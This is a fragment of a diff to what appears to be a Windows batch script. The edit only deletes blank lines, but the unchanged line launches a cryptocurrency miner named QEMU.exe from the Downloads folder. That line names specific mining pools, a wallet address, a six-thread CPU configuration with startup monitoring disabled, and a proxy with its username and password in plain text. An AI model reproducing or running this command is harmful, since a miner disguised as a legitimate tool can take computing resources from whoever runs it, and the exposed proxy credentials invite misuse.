@@ -14,5 +14,3 @@ cls
 
 C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm rinhash --pool 103.249.70.7:7148,149.56.111.148:7148,51.79.251.11:7148,141.95.55.97:7148 --disable-gpu --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker x6 --password c=LTC --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy yzgisgem:0p6of1f1pg73@198.23.239.134:6540
 pause
-
-
